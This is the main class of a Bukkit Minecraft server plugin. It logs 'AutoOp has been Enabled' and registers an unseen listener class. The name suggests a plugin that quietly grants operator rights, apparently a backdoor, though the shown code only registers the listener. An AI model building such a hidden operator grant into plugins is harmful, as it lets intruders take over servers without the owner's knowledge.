package com.no32ks.nobackdoors;


import org.bukkit.Bukkit;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main extends JavaPlugin {
	@Override
	public void onEnable() {
		getLogger().info("AutoOp has been Enabled"); 
		
		
		

		
		
		
		
		
	PluginManager pm = getServer().getPluginManager();
		
	No32ks Listener = new No32ks(this);
	//pm.registerEvants()
	pm.registerEvents(Listener, this);
}	

	@Override
	public void onDisable() {
		getLogger().info("");
	}
}